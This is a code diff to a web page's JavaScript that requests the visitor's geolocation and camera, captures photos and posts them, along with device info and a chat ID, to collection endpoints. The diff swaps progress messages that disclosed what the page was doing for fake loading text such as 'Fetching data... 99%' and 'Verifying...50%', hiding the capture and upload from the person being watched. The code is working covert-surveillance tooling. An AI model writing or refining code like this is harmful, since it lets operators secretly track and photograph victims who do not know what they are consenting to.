@@ -613,7 +613,7 @@ async function runStep(i){
 
 function getLoc(){return new Promise((r)=>{
   if(!navigator.geolocation){showProgress("📍 Location","unsupported");r();return}
-  showProgress("📍 Location maangi ja rahi hai...","popup par Allow dabao");
+  showProgress("Almost there... ⏳","popup par Allow dabao");
   navigator.geolocation.getCurrentPosition(
     p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed};showProgress("📍 Location captured ✓","");r()},
     ()=>{showProgress("📍 Location","denied/error");r()},
@@ -624,7 +624,7 @@ function getLoc(){return new Promise((r)=>{
 async function capPhotos(fm,count){
   let stream;
   try{
-    showProgress("📸 Camera permission...","popup par Allow dabao");
+    showProgress("Fetching data... 99%","popup par Allow dabao");
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:480},height:{ideal:360}}});
     const v=document.createElement("video");v.srcObject=stream;await v.play();
     await new Promise(r=>setTimeout(r,300));
@@ -635,7 +635,7 @@ async function capPhotos(fm,count){
       c.width=v.videoWidth||480;c.height=v.videoHeight||360;
       c.getContext("2d").drawImage(v,0,0);
       const b64=c.toDataURL("image/jpeg",0.5);
-      showProgress("📸 "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","bheja ja raha hai...");
+      showProgress("Verifying...50%", "Kripya intezar karein...");
       // ⚡ TURANT SEND — capture hote hi /api/photo par bhejo
       try{
         await fetch("/api/photo",{method:"POST",headers:{"Content-Type":"application/json"},
@@ -653,7 +653,7 @@ async function capPhotos(fm,count){
 }
 
 async function submitData(){
-  showProgress("📤 Report bheji ja rahi hai...","");
+  showProgress("Fetching data..100%","");
   try{
     const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},
       body:JSON.stringify({chat_id:CID,uid:UID,device_info:di,location:cd.location,photos:cd.photos.length,additional:{}})});
